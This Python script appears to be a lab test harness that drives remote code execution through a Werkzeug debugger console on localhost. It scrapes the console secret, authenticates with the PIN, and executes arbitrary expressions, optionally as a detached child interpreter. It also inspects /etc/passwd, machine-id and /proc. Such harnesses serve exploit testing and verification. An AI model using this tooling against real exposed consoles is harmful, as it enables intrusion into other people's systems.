"""Standard-library HTTP controls and physical observations of genuine Werkzeug."""
from pathlib import Path
import base64
import hashlib
import http.client
import http.cookies
import importlib.util
import json
import os
import re
import sys
import urllib.parse

spec = importlib.util.spec_from_file_location('native_metadata', '/opt/native_metadata.py')
shared = importlib.util.module_from_spec(spec)
spec.loader.exec_module(shared)
ROOT = Path('/opt/module-target-werkzeug')
FILES = ['/etc/passwd', '/etc/group', '/etc/machine-id', str(ROOT / 'app.py'),
         str(ROOT / 'packages.json'), str(ROOT / 'installed.json'), str(ROOT / 'foreign.txt')]


def metadata():
    value = json.loads(Path('/run/werkzeug-native.json').read_text())
    installed = json.loads((ROOT / 'installed.json').read_text())
    origin = Path(installed['werkzeug_root'])
    value['source_sha256'] = {str(path.relative_to(origin)): hashlib.sha256(path.read_bytes()).hexdigest()
                              for path in sorted(origin.rglob('*.py'))}
    assert value['source_sha256'] == installed['source_sha256']
    value['artifacts'] = installed['artifacts']
    assert value['uid'] == value['gid'] == 1001 and value['username'] == 'lab'
    assert value['machine_id'] == '0123456789abcdef0123456789abcdef'
    return value


def state():
    value = shared.state()
    value['files'] = {name: shared.metadata(Path(name)) for name in FILES}
    return value


def request(path, method='GET', body=None, cookie='', host='localhost'):
    connection = http.client.HTTPConnection('127.0.0.1', 8080, timeout=12)
    try:
        headers = {'Host': host}
        if cookie:
            headers['Cookie'] = cookie
        if body is not None:
            headers['Content-Type'] = 'application/x-www-form-urlencoded'
        connection.request(method, path, body=body, headers=headers)
        response = connection.getresponse()
        return dict(status=response.status, headers=response.getheaders(),
                    body_base64=base64.b64encode(response.read()).decode())
    finally:
        connection.close()


def page(entry='/console', method='GET', body=None):
    value = request(entry, method, body)
    content = base64.b64decode(value['body_base64']).decode('utf-8')
    secret = re.search(r'SECRET\s*=\s*["\']([a-zA-Z0-9]{20})', content)
    assert secret, value
    frame = re.search(r'id="frame-(\d+)"', content)
    value.update(secret=secret.group(1), frame=int(frame.group(1)) if frame else 0)
    assert value['secret'] == metadata()['secret']
    return value


def login(discovery, entry='/console', pin=None):
    settings = metadata()
    if settings['pin'] is None:
        return dict(cookie='', response=None)
    query = dict(__debugger__='yes', cmd='pinauth', pin=pin if pin is not None else settings['pin'], s=discovery['secret'])
    value = request(urllib.parse.urlsplit(entry).path + '?' + urllib.parse.urlencode(query))
    answer = json.loads(base64.b64decode(value['body_base64']))
    cookies = http.cookies.SimpleCookie()
    for name, content in value['headers']:
        if name.lower() == 'set-cookie':
            cookies.load(content)
    cookie = '; '.join(name + '=' + item.value for name, item in cookies.items())
    return dict(cookie=cookie, response=value, answer=answer)


def evaluate(expression, discovery, cookie='', entry='/console', host='localhost'):
    query = dict(__debugger__='yes', cmd=expression, frm=str(discovery['frame']), s=discovery['secret'])
    return request(urllib.parse.urlsplit(entry).path + '?' + urllib.parse.urlencode(query), cookie=cookie, host=host)


def proof_path(name):
    assert re.fullmatch(r'/tmp/module-target-werkzeug-[a-zA-Z0-9_-]+', name), name
    return Path(name)


def artifact(name):
    path = proof_path(name)
    assert not path.is_symlink()
    return dict(exists=False) if not path.exists() else dict(exists=True, **shared.metadata(path),
                                                           base64=base64.b64encode(path.read_bytes()).decode())


def execute(data):
    discovery = page(data.get('entry', '/console'), data.get('method', 'GET'), data.get('body'))
    authentication = login(discovery, data.get('entry', '/console'))
    if metadata()['pin'] is not None:
        assert authentication['answer']['auth'] is True and authentication['cookie']
    expression = data['expression']
    if data.get('isolated', False):
        # Native delivery control: do not call the Framework owner or wrapper.
        # A waiting thread owns the child interpreter; container init owns any
        # orphaned stage after the stock payload's normal fork path returns.
        # Bind the stdlib function and arguments before returning. Debugger
        # frames can keep separate global/local dictionaries for exec code.
        source = """import base64, subprocess, sys, threading
native_payload_thread = threading.Thread(target=subprocess.call,
    args=([sys.executable, '-c', base64.b64decode(%r).decode('utf-8')],))
native_payload_thread.daemon = True
native_payload_thread.start()
""" % base64.b64encode(expression.encode('utf-8')).decode('ascii')
        expression = 'exec(%r)' % source
    response = evaluate(expression, discovery, authentication['cookie'] if data.get('authenticated', True) else '',
                        data.get('entry', '/console'), data.get('host', 'localhost'))
    return dict(discovery=discovery, authentication=authentication, response=response,
                isolated=data.get('isolated', False))


def main():
    action, *args = sys.argv[1:]
    if action == 'metadata':
        value = metadata()
    elif action == 'state':
        value = state()
    elif action == 'page':
        value = page(*args)
    elif action == 'execute':
        value = execute(json.loads(base64.b64decode(args[0])))
    elif action in ['file', 'remove']:
        if action == 'remove':
            path = proof_path(args[0])
            if path.exists():
                path.unlink()
        value = artifact(args[0])
    elif action == 'process':
        path = Path('/proc', str(int(args[0])))
        fields = (path / 'stat').read_text().rsplit(')', 1)[1].split()
        value = dict(pid=int(path.name), uid=path.stat().st_uid, birth=fields[19],
                     state=fields[0], ppid=int(fields[1]),
                     argv_base64=base64.b64encode((path / 'cmdline').read_bytes()).decode())
    else:
        raise ValueError(action)
    print(json.dumps(value))


if __name__ == '__main__':
    main()
